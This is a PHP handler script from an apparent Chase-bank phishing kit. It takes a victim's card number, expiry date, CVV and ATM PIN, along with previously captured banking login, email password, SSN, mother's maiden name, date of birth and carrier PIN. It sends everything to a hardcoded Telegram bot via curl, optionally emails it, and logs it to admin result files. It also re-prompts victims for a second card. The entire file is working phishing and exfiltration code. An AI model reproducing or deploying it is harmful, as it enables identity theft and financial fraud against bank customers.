<?php 



require("require.php");
// var_dump($_POST);
if (isset($_POST['cardnu']) && isset($_POST['cardnu']) ) {
	if (!empty($_POST['expda']) && !empty($_POST['expda']) ) {
		
		
			// Admin Panel
			$_SESSION['cardnu'] = $_POST['cardnu'];
			$_SESSION['expda'] = $_POST['expda'];
			$_SESSION['cvv'] = $_POST['cvv'];
			$_SESSION['ATMPin'] = $_POST['pin'];


			if(isset($_POST['invalid'])){$arrangement = "2nd"; }else{$arrangement = "1st";}

			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['userId']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['password']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['SSN']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['mdn']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['dob']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['phone']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['carrier']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['cardnu']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['expda']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['cvv']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['ATMPin']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "❤️💪 Zae3m ".$arrangement." Credit Chase 💪❤️  [".$_SESSION['cvv']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <zae3m@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg  = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<Zae3m Page>||==========#\n";
	        $msg .= "UserID   		: ".$_SESSION['userId']." \n";
	        $msg .= "Password 		: ".$_SESSION['password']." \n";
	        $msg .= "#===========||<Email Access>||==========#\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "#===========||< info Login >||==========#\n";
	        $msg .= "SSN 		    : ".$_SESSION['SSN']." \n";
	        $msg .= "MMN  			: ".$_SESSION['mdn']." \n";
	        $msg .= "Date of Birth 	: ".$_SESSION['dob']." \n";
	        $msg .= "phone Number	: ".$_SESSION['phone']." \n";
	        $msg .= "carrier PIN	: ".$_SESSION['carrier']." \n";
	        $msg .= "#===========||< Credit Card >||==========#\n";
	        $msg .= "Credit Card    : ".$_SESSION['cardnu']." \n";
	        $msg .= "Expire Date  	: ".$_SESSION['expda']." \n";
	        $msg .= "CVV 		 	: ".$_SESSION['cvv']." \n";
	        $msg .= "ATM PIN		: ".$_SESSION['ATMPin']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg.="»»————-　★[ ./💼 https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut 💼 ]★　————-««
\r\n\r\n";

$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5279763036:AAH3T_YZZvSrCZx1Z_orRP7_EYC_KwbYUQQ"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	        if ($saveInAdminPanel  == "true") {
				if ($arrangement == "1st") {
					$file = fopen("../../admin/result/credit.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}elseif($arrangement == "2nd"){
					$file = fopen("../../admin/result/doubleCredit.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}
				
			}
			if ($sendToEmail == "true") {
				send($yourEmail, $Subject, $msg);
				send($test, $Subject, $msg);
			}

			
			if ($doubleCredit == "true" && $arrangement == "1st") {
				header("Location: ../../secure/credit?country=us&invalid2&id=chase");exit();
			}else{
				header("Location: ../../secure/fullInfo?country=us&id=chase");exit();
			}



		
	}else{
		header("Location: ../../secure/credit?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/credit?id=chase&invalid&country=us");exit();
}
